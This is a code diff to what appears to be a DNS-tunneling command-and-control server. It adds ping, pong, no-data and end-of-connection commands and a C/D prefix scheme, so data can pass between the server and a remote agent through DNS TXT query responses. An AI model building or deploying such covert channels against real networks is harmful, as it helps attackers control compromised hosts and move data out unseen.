@@ -21,6 +21,11 @@ MAX_TXT_ENTRY_LEN = 250
 class TransportDns (Transport, ModuleBase):
     """ allows and handles DNS query based connections """
 
+    COMMAND_NODATA = b"NOD"
+    COMMAND_ENDOFCONNECTION = b"EOC"
+    COMMAND_PING = b"PIN"
+    COMMAND_PONG = b"PON"
+
     # noinspection PyMissingConstructor
     def __init__(self, handler):
         """
@@ -301,15 +306,80 @@ class TransportDns (Transport, ModuleBase):
         self.laststagepart = nextdata
         return nextdata
 
-    def serve_ping(self, pingdata):
+    def serve_main(self, indata):
         """
-        should serve a pong response valid for the encoding DNS type
-        :param pingdata: b'pingquery' usually
-        :return: b'pong' or something alike
+        serves a usual data response valid for the encoding DNS type
+        :param indata: byte data that the agent send to us
+        :return: byte data we want to send to the agent
         """
 
         # TODO: remember to match strange encoding for DNS types
-        return b'pong'
+        maxlendata = lenofb64decoded(MAX_TXT_ENTRY_LEN)
+        datatosend = None
+
+        commandflag, indata = TransportDns._decode_indata(indata)
+
+        if commandflag:
+            if indata == TransportDns.COMMAND_PING:
+                datatosend = TransportDns.COMMAND_PONG
+            elif indata == TransportDns.COMMAND_PONG:
+                print_message("pong from agent received")
+                pass  # and answer normally
+            elif indata == TransportDns.COMMAND_ENDOFCONNECTION:
+                datatosend = TransportDns.COMMAND_ENDOFCONNECTION
+                print_error("DNS agent ended connection")
+                # TODO: close our part of the connection
+            elif indata == TransportDns.COMMAND_NODATA:
+                pass  # do not add any data to recvdataqueue but answer normally
+        else:
+            self.recvdataqueue.add(indata)
+
+        # TODO: implement end of connection and ping here aswell
+
+        if not datatosend:
+            datatosend = self.senddataqueue.get(maxlendata)
+
+        if datatosend:
+            datatosend = TransportDns._encode_outdata(False, datatosend)
+        else:
+            datatosend = TransportDns._encode_outdata(True, TransportDns.COMMAND_NODATA)
+
+        return datatosend
+
+    @staticmethod
+    def _decode_indata(indata):
+        """
+        decodes incoming data
+        :param indata: byte data from the agent
+        :return: (commandflag, decoded byte data)
+        """
+
+        if indata[0] == ord('C'):
+            commandflag = True
+        elif indata[0] == ord('D'):
+            commandflag = False
+        else:
+            print_error("received invalid commandbyte: "+str(indata[0]))
+            return None
+
+        resdata = indata[1:]
+        return commandflag, resdata
+
+    @staticmethod
+    def _encode_outdata(commandflag, outdata):
+        """
+        encodes outgoing data
+        :param commandflag: is it a command?
+        :param outdata: byte data to encode
+        :return: encoded outdata
+        """
+
+        if commandflag:
+            outdata = b'C' + outdata
+        else:
+            outdata = b'D' + outdata
+
+        return outdata
 
 
 class DnsHandler(socketserver.BaseRequestHandler):
@@ -405,10 +475,7 @@ class DnsHandler(socketserver.BaseRequestHandler):
         if self.stagerrequest:  # stager request
             return self.transport.serve_stage(qtext)
 
-        if qtext == b'pingquery':
-            return self.transport.serve_ping(qtext)
-
-        return qtext  # TODO: for now we just reply
+        return self.transport.serve_main(qtext)
 
     def _dns_type(self):
         """
@@ -428,7 +495,6 @@ class DnsHandler(socketserver.BaseRequestHandler):
         # if not staging, we can be more creative
         else:
             return self.dnstype
-
 
     def handle(self):
         """
